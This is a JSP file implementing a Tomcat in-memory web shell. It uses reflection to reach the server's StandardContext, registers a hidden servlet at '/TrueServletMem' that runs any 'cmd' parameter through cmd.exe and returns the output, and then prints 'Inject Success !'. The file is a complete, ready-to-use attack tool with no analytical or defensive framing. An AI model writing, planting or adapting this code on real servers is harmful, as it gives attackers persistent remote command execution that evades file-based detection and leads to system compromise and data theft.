<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Wrapper" %>


<%
    final String name = "xsw6Servlet";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    HttpServlet servlet = new HttpServlet() {
        @Override
        public void init() throws ServletException {
        }

        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
            if (req.getParameter("cmd") != null) {
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext() ? s.next() : "";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request) requestF.get(req);
                    request.getResponse().getWriter().write(out);
                } catch (NoSuchFieldException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
            }
        }
    };

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setServlet(servlet);
    wrapper.setName(name);
    wrapper.setServletClass(servlet.getClass().getName());

    //将Wrapper添加到StandardContext
    standardContext.addChild(wrapper);
    // 设置ServletMappings
    standardContext.addServletMappingDecoded("/TrueServletMem", name);
    out.print("Inject Success !");
%>